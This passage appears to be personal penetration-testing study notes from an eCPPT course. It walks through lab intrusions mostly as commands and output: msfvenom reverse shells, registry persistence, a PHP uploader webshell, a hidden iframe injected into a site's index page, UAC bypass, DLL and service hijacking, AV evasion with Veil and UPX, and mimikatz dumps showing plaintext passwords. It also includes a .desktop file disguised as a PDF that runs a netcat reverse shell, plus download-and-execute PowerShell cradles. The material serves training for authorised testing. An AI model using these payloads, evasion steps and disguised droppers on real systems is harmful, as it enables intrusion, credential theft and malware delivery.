auxiliary(telnet_login) &gt; sessions -i 1 [meterpreter] &gt; portfwd add -l 2223 -p 23 -r 10.32.121.23 telnet localhost 2223 \tnetadmin \tabc123      update the payload to the target machine    C:\\inetpub\\ftproot&gt;dir // view via telnet if the payload is there // open a handler with the same options as the payload   // run the payload  C:\\inetpub\\ftproot&gt;runas /user:netadmin msf_reverse.exe           maintaining access via persistence // set the payload in order to execute our msf payload at system startup            in meterpreter session:       reg setval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run -d '\"C:\\inetpub\\ftproot\\msf_reverse.exe\"' -v msf_reverse   //Where -k indicates the registry key path, -d the value of the key and -v the name.   C:\\inetpub\\wwwroot\\intranet&gt;type wp-config.php                                                                      type wp-config.php   /** MySQL database password */                                                                                       define('DB_PASSWORD', 'eLSMySqlDBPwd0905'  root:eLSMySqlDBPwd0905:10.32.121.12   2nd time          example: we dont have access to the second machine, but the first machine we explored has. in this case we need to add a route within meterpreter  → run autoroute -s &lt;ip/network&gt;            now we can run an enumeration  → run post/windows/gather/enum_applications  → run post/multi/gather/filezilla_client_cred  // is the password is not readable, we can grab the file manually  // C:\\Users\\Administrator\\AppData\\Roaming\\FileZilla\\sitemanager.xml       now that we have the login/password of the ftp   we need to add socks proxy to access that machine use auxiliary/server/socks_proxy     cat /etc/proxychains4.conf version 4a - port 9050           now we can use proxychains to scan   proxychains nmap demo1.ine.local -sT -Pn -p 1-50      This scan is the safest way to identify the open ports. We could use an auxiliary TCP port scanning module. But those are very aggressive and can kill your session.    open ports 21 and 22 we can port forward these ports to find the running application name and version. but we know that is telnet and ssh ‘usually’      in the first machine we know that rdp is open on port 3389   so we can create an user and add in the RDP group to have GUI access   sessions -i 1 shell net user guest_1 guestpwd /add net localgroup \"Remote Desktop Users\" guest_1 /add net user      access the target   xfreerdp /u:guest_1 /p:guestpwd /v:demo.ine.local      open the ftp client (filezilla)   login with the credentials   grab the usernames.txt files   there is 3 usernames:        // administrator - sysadmin - student       now we can target the port 22 of the second machine   portfwd add -l 1234 -p 22 -r 10.0.21.78 portfwd list  nmap -sV -p 1234 localhost      we can run hydra to try to find the password For the 3 usernames we have:   proxychains hydra -l administrator -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo1.ine.local ssh \t// administrator:password1      background   use auxiliary/scanner/ssh/ssh_login   show options   set gatherproof false   run      now we have access to the second machine    Lab Blind Penetration Test   my ip 172.16.5.20   Web Server IP address: 10.100.0.100 Any corporate private address in the range: 192.168.78.0/24   msf6 exploit(unix/webapp/php_include) &gt; set phpuri /index.php?pag=XXpathXX      Open a web server  // c99, b374k, r57 https://github.com/b374k/b374k   // nano include    &lt;?php if(isset($_POST[\"submit\"])) { $name = $_FILES['file_upload']['name']; // Check for errors     if($_FILES['file_upload']['error'] &gt; 0) die('An error ocurred');      // Upload file     if(!move_uploaded_file($_FILES['file_upload']['tmp_name'],$name))         die('Error uploading');      die('File uploaded successfully.'); }?&gt;  &lt;form method='post' enctype='multipart/form-data'&gt;     File: &lt;input type='file' name='file_upload'&gt;     &lt;input type=\"submit\" value=\"Upload Image\" name=\"submit\"&gt; &lt;/form&gt;            Send the script to the vulnerable http URL // Upload the msfvenom payload            set a listener          we have a meterpreter session    load sniffer sniffer_interfaces sniffer_start 2 //let it run For 5 minutes sniffer_stop 2  sniffer_dump 2 sniff2.pcap wireshark sniff2.pcap      [+] if sniffer has error, we need to gain system first    use post/multi/recon/local_exploit_suggester use exploit/windows/local/ms10_015_kitrap0d set session 4 set LHOST &lt;tap0 ip&gt; set LPORT 4444 run getsystem      read the pcap file statistcs &gt; Endpoints we found 2 more address 192.168.78.5 192.168.78.25   There are two different Metasploit modules that we can use to achieve the goal of client exploitation.      auxiliary/server/browser_autopwn     exploit/multi/browser/java_rhino   This gives us a URL that we can use to exploit the target organization corporate network.   Next, we inject a hidden iframe in the members area home page that loads our malicious page each time someone visits the page.   To insert the code, we can use the Meterpreter session to download the index.php file. Then, we can add the following code, and re-upload the index.php file to the web server:       if (isset($_GET['pag'])){         $variabile1=$_GET['pag'];         include($variabile1);      echo '&lt;iframe src=\"http://172.16.5.20:8081/uo3eXen8t0I1n\" width=1 height=1 style=\"visibility:hidden; position:absolute;\"&gt;&lt;/iframe&gt;';      }else{       add the script to the index.php, but modify thepayload to the result of your exploit java_rhino   // http://172.16.5.20:8081/QNtJ7n      upload the modified index.php      later we will use the  auxiliary/server/browser_autopwn to more results    2nd time      to find the authentication type in a web environment  → davtest -url http://demo.ine.local/webdav  // We can notice that /webdav folder is secure with basic authentication.   - Metasploit http_login module to discover the username and password to access the folder. - msfconsole -q - use auxiliary/scanner/http/http_login - set RHOSTS demo.ine.local - set AUTH_URI /webdav/ - set USER_FILE  /usr/share/metasploit-framework/data/wordlists/common_users.txt - set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt - set VERBOSE false - exploit   Lets run the davtest and enumerate the /webdav folder \\for uploadable and executable files.   → davtest -auth administrator:tigger  -url http://demo.ine.local/webdav      Lets upload an .asp backdoor on the target machine to /webdav directory using cadaver utility.    cadaver http://demo.ine.local/webdav Username: administrator Password: tigger ls      now we can interact with the cadaver tool        lets upload a webshell.asp backdoor  → put /usr/share/webshells/asp/webshell.asp            we can access the web browser and insert commands  → http://demo.ine.local/webdav/webshell.asp?cmd=whoami            lets get a better shell  → msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.6 LPORT=4444 -f exe &gt; backdoor.exe            now we can upload this malicious file using cadaver  → put /root/backdoor.exe       open the web to initiate the backdoor.exe        http://demo.ine.local/webdav/webshell.asp?cmd=dir+c%3A%5C       after some trial and error, we found the url        C:\\inetpub\\wwwroot\\webdav\\backdoor.exe            start a listener in meterpreter  → use exploit/multi/handler       now we can execute the backdoor   C:\\inetpub\\wwwroot\\webdav\\backdoor.exe   pos exploitation     we have meterpreter shell   getuid   sysinfo   getsystem // to elevate the privileges // it failed   - shell - whoami /all      SeImpersonatePrivilege is enabled       first - migrate the process   \tCTRL + C \tmigrate -N w3wp.exe      lets load incognito      → load incognito    → list_tokens -u      administrator is available to impersonation       impersonate_token DOTNETGOST\\Administrator      we have root access    References      DAVTest (https://github.com/cldrn/davtest)     Cadaver (https://github.com/grimneko/cadaver)     ASP Webshell (https://raw.githubusercontent.com/tennc/webshell/master/asp/webshell.asp)   lab privesc   bypass UAC  use post/windows/gather/win_privs use exploit/windows/local/bypassuac  post/multi/recon/local_exploit/suggester \texploit/windows/local/ms10_092_schelevator &gt; vulnerable   bypass UAC manually  msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.50.50.50 LPORT=4700 -f exe --platform Windows &gt; shell.exe           upload the payload from msfvenom and the bypassuac found in this dir (/usr/share/metasploit-framework/data/post) // ofc must be the right OS version            open a listener with the same options as the msfvenom payload       go to the session  shell bypassuac-x64.exe /c C:\\Users\\eLS\\Desktop\\shell.exe      we can go to the new meterpreter session   getsystem        now we have SYSTEM privileges bypassing UAC manually       With system privileges we can run incognito and impersonate a token   load incognito list_tokens -u impersonate_token &lt;system\\\\users&gt;      Dont forget the double \\    privesc  migrate to the explorer.exe ps -S explorer.exe migrate &lt;PID&gt;       we can also use migrate -N     getsystem //failed  shell net localgroup administrators we can bypass UAC with → UACMe Tool = https://github.com/hfiref0x/UACME      For that we need to create a malicious file  → msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.2 LPORT=4444 -f exe &gt; ‘backdoor.exe’   go to temp folder and upload the files  CTRL + C cd C:\\\\Users\\\\admin\\\\AppData\\\\Local\\\\Temp upload /root/Desktop/tools/UACME/Akagi64.exe . upload /root/backdoor.exe . ls      open a handler in meterpreter   then execute the Akagi64.exe file   shell Akagi64.exe 23 C:\\Users\\admin\\AppData\\Local\\Temp\\backdoor.exe      moreover IFileOperation UAC Bypass = : https://www.fuzzysecurity.com/tutorials/27.html       we have a shell then getsystem to get a better privileged shell    with Meterpreter  // the same task can be done with metasploit post module  run post/multi/recon/local_exploit_suggester use exploit/windows/local/bypassuac_dotnet_profiler    Lab Privesc via Services  msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.50.50.100 LPORT=4700 -f exe &gt; shell.exe   C:\\Program Files\\OpenVPN\\bin  run winenum run post/windows/gather/win_privs // net start   To escalate privileges, we should find and exploit services that:      run with higher privileges   automatically start at boot   OR can be restarted (with lower privileges)   OR are vulnerable to DoS (meaning that we can cause the service to crash and let Windows to automatically restart it)   have their binaries in paths where we have write privileges.   C:\\Windows\\system32&gt;cd C:\\Users\\els cd C:\\Users\\els  C:\\Users\\els&gt;wmic service &gt; serv_list.txt wmic service &gt; serv_list.txt   wmic service WHERE \"NOT PathName LIKE '%system32%'\" GET PathName, Name &gt; filter_service.txt      there is 12 services, in the real world we need to test all these 12 services  to see if we have write permission in one of them    Verify if you have (M) write / modify permissions  icacls \"C:\\Program Files\\OpenVPN\\bin\\openvpnserv.exe\"  C:\\Windows\\system32&gt;icacls \"C:\\Program Files\\OpenVPN\\bin\\openvpnserv.exe\" icacls \"C:\\Program Files\\OpenVPN\\bin\\openvpnserv.exe\" C:\\Program Files\\OpenVPN\\bin\\openvpnserv.exe els-PC\\els_user:(I)(M)                                              BUILTIN\\Administrators:(I)(F)                                              NT AUTHORITY\\SYSTEM:(I)(F)                                              BUILTIN\\Users:(I)(RX)   Verify if run as LocalSystem  we can search in the first serv_list file ``` sc qc &lt;service&gt; ```      make a payload from msfvenom with the same name as our target service change the name of the original to a backup mv openvpnserv.exe openvpnserv.exe.bkp upload the malicious payload open a listener now we can reboot the machine - but this is not stealthy from meterpreter &gt; reboot -f 2    Sequence of death      we need to set a handler with a autorun to migrate to another process (2 options)            msf exploit(handler) &gt; set AutoRunScript explorer.exe       msf exploit(handler) &gt; set AutoRunScript migrate -f              msfvenom payload, adding a malicious payload in the original openvpnserv.exe file    msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.50.50.100 LPORT=4460 -f exe -e x86/shikata_ga_nai -i 15 -k -x openvpnserv.exe.bkp&gt; openvpnserv.exe      then we can upload the file to the machine and reboot -f 2 wait For the session in meterpreter       Try harder -.-    2nd time           For example, if u have access to the system and go to shell to see if the user has administrator privileges  → net localgroup administrators  // but it failed            so we can execute an enumerate tool such as PowerUp.ps1       open a web server   load powershell on the meterpreter session, so we can load PowerUp script in the memory   load powershell powershell_shell iex (New-Object Net.WebClient).DownloadString('http://10.10.15.3/PowerUp.ps1')      lets run the powerup.ps1   Invoke0AllChecks      Now, there are two ways to abuse the service.    1.): We can create a new user on the target machine with administrator privileges and use that. 2.): We can run the command as the highest privilege available to that service.   Both can be done using the Invoke-ServiceAbuse command using powershell.   add an existente user  Invoke-ServiceAbuse -Name AppReadiness -Command \"net localgroup administrators bob /add\" net localgroup administrators    create a new user  - Invoke-ServiceAbuse -Name AppReadiness  -UserName ine -Password password_123 -LocalGroup \"Administrators\" - net user   msfconsole -q use exploit/windows/misc/hta_server show options run &gt; grab the url   Invoke-ServiceAbuse -Name AppReadiness  -Command \"mshta.exe http://10.10.15.3:8080/ljUAsN.hta\"      we have a new meterpreter session with system privileges    Finding and Exploiting DLL Hijacking Vulnerabilities   172.16.48.100   C:\\Program Files (x86)\\Agnitum\\Outpost Firewall 1.0\\outpost.exe   Process Explorer  first we open this with administrator privileges search For an application that is running with system privileges, a third party application go to the properties, copy the path check the security of the application and the folder where it is installed check if the user have access   Proc monitor  go to filter add Process Name =  add Result = NAME NOT FOUND add path contains = dll kill the process with process explorer open cmd with administrator privileges restart the process = net start OutpostFirewall go to the proc monitor &gt; should appear some processes we need to choose one that is running with system priveleges and we must have access to the dll folder path in this case there is two &gt; UxTheme.dll and imageres.dll // we have everything we need, we can log in as lowpriv user and exploit   Payload  msfvenom -p windows/meterpreter/reverse_https LHOST=&lt;kali IP&gt; LPORT=4444 -f dll &gt; UxTheme.dll   in this case we generate a 32-bit payload because the outpost.exe is 32-bit we can use windows/meterpreter/rever_tcp, is more reliable but less stealthy   send the payload to the target   open a web server:  python3 -m http.server   grab the file in the target machine:  powershell -c iex (New-Object Net.WebClient).DownloadFile('http://&lt;attacker_IP&gt;/UxTheme.dll', 'C:\\Program Files (x86)\\Agnitum\\Outpost Firewall 1.0\\UxTheme.dll')   Handler  set a listener in meterpreter restart the machine&gt; shutdown /r /t 0   we should get a shell back \t// it took +/- 4 minutes   2nd time   in Process Monitor Tool: Step 4: Now, lets apply a “CreateFile” filter to see all the missing files.   Right-click on “CreateFile” → Include ‘CreateFile’      It shows NAME NOT FOUND which means the path mentioned in the same row is missing.       make sure u have write access to that folder   Get-ACL 'C:\\Users\\Administrator\\Desktop\\dvta\\bin\\Release' | Format-List   restart the procMon add another filter = ctrl+L process Name is  - add Operation is CreateFile      Right-click on NAME NOT FOUND → Include NAME NOT FOUND       add another filter: ctrl+L   Path begins with    see which .dll file is missing (in this case there is 2, both can be exploitable)   msfvenom  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.2 LPORT=4444 -f dll &gt; Dwrite.dll      open a web server   to grab the file and copy into the directory (in Windows)  iwr -UseBasicParsing -Uri http://10.10.15.2/Dwrite.dll -OutFile C:\\Users\\Administrator\\Desktop\\dvta\\bin\\Release\\Dwrite.dll   References   Process Monitor (https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) Metasploit (https://www.metasploit.com/) DVTA (https://github.com/secvulture/dvta)   Lab Bypassing AV   // (Avast and Microsoft Security Essentials)   Victim01-Avast: 172.16.5.10 Victim02-MSE: 172.16.5.5 Pentester (Your Machine): 172.16.5.50   rdp: \tadmin \tet1@sR7!   without AV  we did a regular msfvenom payload  send to the target  setup a handler and execute it we got a meterpreter shell back now we can For example:  execute -f calc.exe sysinfo  getuid etc   grab the file in the web server  powershell -c iex (New-Object Net.WebClient).DownloadFile('http://&lt;kali ip&gt;/&lt;file&gt;', '&lt;path you wanna save/outputfile&gt;')   // or open the browser http:///   Trying to bypass AV - Avast  1 attempt: regular payload  (msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.5.50 LPORT=4444 -f exe &gt; payload.exe) AV caught   2 attempt: encoded payload  (-e x86/shikata_ga_nai -i 5) AV caught      upx –best –ultra-brute -f rTCPenc.exe -o rTCPenc2.exe    Bypass AV -&gt; (Avast &amp; MSE)   3 attempt: using Veil  apt -y install veil /usr/share/veil/config/setup.sh --force --silent   if necessary  chown root -R wine/ OR // chown root:root -R /var/lib/veil/wine apt install winbind   Veil:  use 1 = evasion list = to list the available payloads use 28 = python/meterpreter/rev_tcp.py // set LPORT 4444 // set LHOST &lt;kali ip&gt; insert a name For your payload 1 = to use the default PyInstaller      send the payload to the target and execute it  we should get a shell back even tho the AV is enabled       the same veil payload bypassed the MSE (Microsoft Security Essentials)       4 atempt if its not enough     upx --best --ultra-brute -f rTCPveil.exe -o rTCPveil2.exe              we need to pack the veil file with UPX there is always something more that we can try    Good to know      We do not recommend that you upload your malicious files generated by any source (msfvenom, veil, etc.) to online AV scanners like www.virustotal.com, thus, because later on these files are shared with AV companies who will be able to create signatures to catch them. The best thing to do is first, find out what your targets customer use as AV solution (see job posts and forums in order to see if its published somewhere. You may also use your social engineering skills (call and ask) and you will be surprised how people share this information without any concerns. Then download a trial version of the AV solution used by your customer in a lab environment and update it to the latest virus definition. Once you are able to bypass it, you can deliver the piece of code considering that its part of your engagements scope.       References   https://github.com/Veil-Framework/Veil   https://upx.github.io/   Lab From XSS to Domain Admin   myip 172.16.111.30 blog.fooresearch.site (172.16.111.1)   task 1 - beEF-XSS  \t&lt;script src=\"http://172.16.111.30:3000/hook.js\"&gt;&lt;/script&gt;   Commands &gt; Host &gt; Get System Info &gt; java 1.7.0_17 is installed   msf &gt; use exploit/multi/browser/java_jre17_provider_skeleton  set srvhost and lhost = your kali ip set srvport and lport = as you wish, but it must be different   send the payload  two options: \tyou can re-use the XSS in the blog \tyou can inject an invisible iframe in the hooked browser   with second option: \tbeEF &gt; Commands &gt; Misc &gt; Create Invisible Iframe &gt; paste the URL from the msf payload   in meterpreter shell  getuid  sysinfo ifconfig &gt; there is another network : 192.168.200.210   with shell: set = to show the variables in the target      [!NOTE] look For: LOGONSERVER, USERDNSDOMAIN, USERDOMAIN, USERNAME    with meterpreter:  load extapi adsi_computer_enum examplead.lan adsi_user_enum   Credential Stealing  AD policies are stored in a special UNC path:  %USERDNSDOMAIN%\\Policies   You cannot access UNC paths via cmd, use the Sysvol share you can find on a DC:  %LOGONSERVER%\\Sysvol   drop to shell:  net use X: \\\\DC01\\SysVol = to mount the SysVol on the DC as a drive called X X: = to go to the mounted drive cd examplead.lan\\Policies dir /s *.xml = we need to search the groups.xml in this directory   X:\\examplead.lan\\Policies{69BCC2AD-B7E5-4E02-833D-DBFDD19E7EB4}\\Machine\\Preferences\\Groups      those files contain information about local users and groups deployed via group policies System administrators usually use AD policies to deploy a local administrator account in a domain environment Those files also contain information about usernames, encrypted passwords and the groups    type &lt;full path of the groups&gt;\\Groups.xml  \t&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;Groups clsid=\"{3125E937-EB16-4b4c-9934-544FC6D24D26}\"&gt;&lt;User clsid=\"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\" name=\"LADM\" image=\"0\" changed=\"2014-07-31 12:11:27\" uid=\"{02526B4C-A2A5-48D9-A357-80B0D8E9825D}\"&gt;&lt;Properties action=\"C\" fullName=\"\" description=\"\" cpassword=\"0cU/uGQrF5Xfhm61HAK8wFlfYce2W6ODQAeI957VrqY\" changeLogon=\"0\" noChange=\"0\" neverExpires=\"1\" acctDisabled=\"0\" userName=\"LADM\"/&gt;&lt;/User&gt;         &lt;Group clsid=\"{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}\" name=\"Administrators\" image=\"2\" changed=\"2014-07-31 12:11:54\" uid=\"{AEAF1E3C-2DC1-4206-A907-6064727BB08A}\"&gt;&lt;Properties action=\"U\" newName=\"\" description=\"\" deleteAllUsers=\"0\" deleteAllGroups=\"0\" removeAccounts=\"0\" groupName=\"Administrators\"&gt;&lt;Members&gt;&lt;Member name=\"LADM\" action=\"ADD\" sid=\"\"/&gt;&lt;/Members&gt;&lt;/Properties&gt;&lt;/Group&gt; &lt;/Groups&gt;    LADM = user 0cU/uGQrF5Xfhm61HAK8wFlfYce2W6ODQAeI957VrqY = encrypted password GroupName = administrator   Decrypt the password  gpp-decrypt 0cU/uGQrF5Xfhm61HAK8wFlfYce2W6ODQAeI957VrqY Pm2fUXScqI   back to meterpreter  run post/windows/gather/enum_computers //there is 3 computers in the network      we can run a port sweep or a portscan, but before that we need to add the route to the machine we own    background  route add 192.168.200.0 255.255.255.0 1 use auxiliary/scanner/smb/smb_version \tset rhosts 192.168.200.100,200,210      one is windows 2008, an unidentified host, one windows 7 that we already have access we cant use psexec because we do not have domain admin access so we need to create a executable payload and send to the machine    Create a payload  use payload/windows/meterpreter/reverse_tcp set options  generate -f exe -o &lt;payload.exe&gt;   set the listener  …   In a domain environment, a default Windows 7 machine:     does not accept a psexec command from a non-domain administrator     has UAC enabled     prevents a local administrator from accessing a users profile without a UAC prompt   upload the payload   in meterpreter:  cd ../ upload &lt;payload.exe&gt;   shell:  icacls &lt;payload.exe&gt; /grant Everyone&gt;(F) = to grant everyone full control to the payload we just uploaded   meterpreter:  background use post/windows/manage/run_as or exploit(windows/local/run_as) set CMD C:\\\\Users\\\\SecondUser\\\\msfadexploit.exe set USER LADM set PASSWORD Pm2fUXScqI set SESSION 1 set DOMAIN PCCLIENT7 run      now we get a shell with the LADM user we cant use getsystem yet, we have to bypass UAC first    bypass UAC  use exploit/windows/local/bypassuac_injection set options run   ps -U EXAMPLEAD.* kill (moderApp.exe PID) cd &lt;path to moderapp&gt; del modernapp.exe     this way the user cannot open the app again       after some time we can see with ps command, that a lot of cmd.exe and ping.exe are open this means that the user called the IT and its trying to fix the issue of the program that died by itself so now we load mimikatz to grab the IT credentials    load mimikatz / kiwi creds_kerberos creds_wdigest   meterpreter &gt; creds_kerberos  [+] Running as SYSTEM [*] Retrieving kerberos credentials kerberos credentials ====================  Username    Domain         Password --------    ------         -------- (null)      (null)         (null) ExampleAdm  EXAMPLEAD.LAN  (null) LADM        PCCLIENT7      (null) SecondUser  EXAMPLEAD.LAN  (null) exampleadm  EXAMPLEAD.LAN  (null) pcclient7$  EXAMPLEAD.LAN  (null)    meterpreter &gt; creds_wdigest  [+] Running as SYSTEM [*] Retrieving wdigest credentials wdigest credentials ===================  Username    Domain     Password --------    ------     -------- (null)      (null)     (null) LADM        PCCLIENT7  Pm2fUXScqI PCCLIENT7$  EXAMPLEAD  ea e9 9c 5a 62 25 eb 89 0f 7a 5d e3 3a a3 03 d5 84 76 29 2e 3e ca dd 58 0d f3 c9 3d a6 95 a                        3 2b 45 01 54 36 18 2b 72 08 0c 2c 23 f2 e6 2c d3 74 ed cc e3 9a a1 76 82 68 f4 60 a5 c6 6e                         4d 01 9d a3 66 c5 4e f9 99 cb 94 3a d7 13 f4 c4 a3 67 0b a5 54 40 27 39 7d ef 95 2d 90 1b                        31 e3 7d 0a 98 9e 3f 8d 3d 17 e9 50 d4 05 a4 02 a4 83 f5 f8 42 88 83 48 c0 f5 dd e7 4c 22 9                        f 05 3a a8 0d d4 8f a7 f3 5a fb b1 80 56 3a 01 33 7e 65 2c f8 9d ce 56 77 fd cb 5b 35 2c 2a                         7e bb 40 89 83 25 f4 3a 28 7a 32 1f f0 89 32 0d ca 38 95 60 d2 a7 ca 2f d6 45 9f 01 56 2d                        a2 50 a9 5c 36 f6 08 d3 43 d8 73 7d 39 60 86 36 f3 7c 82 31 5d e5 72 6b 57 ab 4b d7 49 1d 3                        d ad 20 b0 75 9d 05 4e 83 5d 7b e1 a5 bf 4a e8 8e 6d e7 a7 b2 e8 28 39 90 a5 62 88 SecondUser  EXAMPLEAD  consciousAlert... exampleadm  EXAMPLEAD  manageth3PCz   grab the credentials  LADM        PCCLIENT7  Pm2fUXScqI SecondUser  EXAMPLEAD  consciousAlert... exampleadm  EXAMPLEAD  \"manageth3PC'z\"   RDP connection  rdesktop -u examplead\\\\exampleadm -p \"manageth3PC'z\" 127.0.0.1   Anonymity      Transparent Testing:   if you are performing a security posture review, then there is no need for anonymity as the client knows you are coming and what purpose is for being there, To successfully undertake this, ensure you supply your testing IPs to the customer, so you do not become inadvertently blocked during testing.      Dark Testing:   If the customer wants to not only test their security posture, but also their security staff and security products knowledge, processes, procedures, discovery, reporting and response tactics, then a dark test is the way to go.   Browsing Anonymously   Keep in mind that, anytime you send traffic through another person/companies computers to hide yourself, you are exposing all data you see to that person/company as they can sniff the data.   HTTP Proxies  The proxy server works on your behalf to request the web page, and subsequently sends it back to you. This causes the web server to see the proxy servers address, not yours.   There are two general types of proxies: \t- Ones that require you to change your web browser settings in order to send requests through them \t// HTTP, SSL/HTTPS, FTP, Gopher or SOCKS \t- Others that are used through their web pages   Verify your public IP address  http://www.checkip.org/ http://www.whatsmyip.org/   Using a proxy web site  https://hide.me/en/proxy https://hidemy.name/en/proxy-list/   Proxies Sub-types           High anonymous (elite proxies):   These proxies do not change request fields and look like they come from a real IP.   The users real IP is hidden and there is no indication to the web server that the request is coming from a proxy.            Anonymous proxies:   These proxies server also do not show your real IP address, but they do change the request fields. As a result, by analyzing the web log, its possible to detect that a proxy server was used.   Not that this matters however, some server administrators do restrict proxy requests, so they use this type of information to block requests, such as this, in the future.            Transparent proxies:   Aka HTTP relay proxies, these systems change the request fields thus, they transfer the real IP address of the user.   In other words, these proxy systems offer no security and should therefore never be used For security testing. The only reason to use these systems, if For network speed improvements.       How to check For Real anonymous Proxies  Check the anonymity policy of the site you have chosen to use Visit a site you own and verify the visitor logs   some anonymity testing: \thttps://centralops.net/co/ \thttps://pentest-tools.com/home \thttp://do-know.com/privacy-test.html \thttp://www.all-nettools.com/   HTTP_VIA  /  HTTP_X_FORWARDED_FOR  A standart HTTP request: iF HTTP_VIA contains an address (or in case of chained proxies, many addresses), it actually indicates that there is a proxy server being used. The IP address included in this field is actually the IP address of the proxy server. In contrast, the HTTP_X_FORWARDED_FOR field, if present, indicates the actual IP address of the client that the proxy is acting on behalf of For the communications.   // In case of high anonymity proxy systems  // the http_via and http_x_forwarded_for would be: not determined // its the same request as the original without proxy, but in this case the REMOTE_ADDR (IP) is from a proxy, but the administrators would have no indication that a proxy system is being used.   TOR Network  https://www.torproject.org/ https://www.torproject.org/about/overview.html.en  It protects you by bouncing your communications around a distributed network of relays run by volunteers all around the world. This set of volunteer relays is called the Tor Network,      Client operating with Tor:   Client requests a list of Tor nodes from a directory server   The client randomly selects nodes on the Tor Network (called relays) and encrypts the traffic between each relay.   If the client request a second destination after the specified time limit, another separate tunnel is created For that communication repeating the process.      Tor only works For TCP streams and can be used by any application with SOCKS support. Its highly recommended that you use protocol-specific support software, if you do not want the sites you visit to see your identifying information    Tunneling for Anonymity           SSH   ssh encryption offers more secure privacy and security protection than an anonymous proxy server alone.   ssh encrypts all communications to and from the client and server. This is achieved by activating a forwarder and a listener to both send a receive the traffic.            IPSEC VPNs       Port Forwarding  https://help.ubuntu.com/community/SSH/OpenSSH/PortForwarding types: local, remote, dynamic      example 1 we wanna access a machine via telnet, but the network is blocking telnet traffic we can tunnel our telnet traffic through SSH // local port:3000 &gt; ssh tunnel &gt; ssh server &gt; unencrypted &gt; homepc:23   ssh -L 3000:homepc:23 root@mybox   ssh -L &lt;local port to listen on&gt;:&lt;remote machine&gt;:&lt;remote port&gt; &lt;username@sshserver/target&gt;   we can now access the remote machine with: ‘’’’ telnet 127.0.0.1:3000 ‘’’’ the traffic will automatically go through the SSH tunnel, and it will be also encrypted.      example 2 we have two machines in the same network: // our machine: 192.168.231.134 // ssh server machine: 192.168.231.135 // there is a mysql server, but it accepts only local connection (127.0.0.1) // since we can not establish a connection with the mysql server from our client machine, we can use a ssh tunnel to forward the connection from our machine.   ssh -L 3000:localhost:3306 user@192.168.231.135      the command creates a tunnel from our local port 3000, to the localhost address on the SSH server, on port 3306 (default MySQL port) we can now access mysql:    mysql -h 127.0.0.1 -P 3000 -u root    Social Engineering      Forms of social interactions:   The desire to be helpful   The tendency to trust people   The fear of getting in trouble   Conflict avoidance   Types of Social Engineering   Pretexting:  The art of placing a person in a realistic but fake situation, in order to get them to divulge information such as social security, bank account, user id and passwords. // example: Impersonate a help desk employee ans assisting another target employee with either a data move or a software update // the fake help desk can trick the employee to download an update For their machine, thereby running malware on their system.   Phishing  Is an attack that utilizes a fraudulent email, in order to coerce people into executing malicious code or revealing pertinent information.   types:     Whaling: // Targets Executives in an organization, such as the CFO For gaining specific types of information   Spear Phishing: // Targets specific individuals within an organization, to try and circumvent detection   Baiting  Takes advantage of one of the most basic traits of humanity which is Curiosity. The attacker will leave a media such as a CD, DVD or USB stick in a conspicuous location, relying on the curiosity factor of a passerby to pick up the media and attempt to take a look at its contents. The attacker will place malware such as keystroke loggers, backdoors, etc. on the media, in order to either gain access or gather information from any system that tries to read the media.   Physical  The social engineering will try to gain access to a facility or a restricted area. This is often accomplished by either piggybacking or shadowing a person into an entrance. may wear a face badge in order to enter the building etc Most organization lack proper training For their staff when it comes to simple observation as to the validity of an ID badge.   Samples of Social Engineering Attacks  http://www.virustotal.com/   Sample 1: Canadian Lottery  it appears we have on money, but we need to open the attachment to see the details. there is no viruses but they ask us to send information and the account is not from canadian lottery domain   Sample 2: FBI E-Mail  verify the headers of the email verify the domains of the senders   Sample 3: Online Banking  it makes the link look like official but redirecting the victim to a page that is owned by them (attackers) the page would look real, but ultimately the person is just giving up their banking information   Pretexting Samples  pretexting is putting someone in a familiar situation to get them to divulge information outage notification = interrupção de energia so, we can take the advantage of the situation and call the person from that neighborhood and get information every states has a set of prefixes, that is used For Social Security Numbers. https://www.einvestigator.com/social-security-numbers-ssn/   keep in mind that is illegal: (since Gramm-Leach-Bliley act of 1999)      use false, fictitious or fraudulent statements or documents to get customer information from a financial institution. use forged, conterfeit, lost, or stolen documents to get customer information from a financial institution or directly from a customer of a financial institution. ask another person to get someone elses customer information using false, fictitious or fraudulent statements or using false, fictitious or fraudulent.    Tools  SET - The Social-Engineer Toolkit = https://github.com/trustedsec/social-engineer-toolkit   SET its a open-source penetration testing framework designed For social engineering. manual: https://github.com/trustedsec/social-engineer-toolkit/tree/master/readme   setoolkit  1 = to select - Spear-Phishing Attack Vectors 1 - perform a Mass Email Attack there is many exploits and custom executables select the payload, the target email address, the template and the SMPT configuration to send the phishing email   Social Engineering Linux Targets   test.desktop [Desktop Entry] Type=Application Name=document.pdf Exec=/bin/nc -e /bin/sh &lt;kali ip&gt; &lt;port&gt; Icon=&lt;path to icon&gt;       we can search For icons with: locate *pdf.svg    chmod +x test.desktop      we can send the document to the target machine and execute it to gain reverse shell    Lindrop  https://github.com/secmode/LinDrop/blob/master/LinDrop.py https://www.obscurechannel.com/x42/lindrop.html   python LinDrop.py  output name: &lt;the file that will be displayed to the user&gt; output zip: &lt;same name&gt; // create a msfvenom payload // msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;kali ip&gt; LPORT=&lt;port&gt; -f elf &gt; payload // open a web server with python remote payload URL: &lt;http://&lt;kali ip&gt;/payload&gt; //prepare a multi handler listener remote pdf to display: &lt;http://kali ip/pdf of your choice&gt;      when the pdf is opened, we will gain a reverse shell from meterpreter    ","categories": ["notes","ecppt"],
        "tags": ["begginer","pentest","recon","internal","osint"],
        "url": "/notes/ecppt/networksecurity/",
        "teaser": "/assets/images/posts/2023-11-19-ecppt/ecppt-teaser3.jpg"
      },{
        "title": "3 - Powershell",
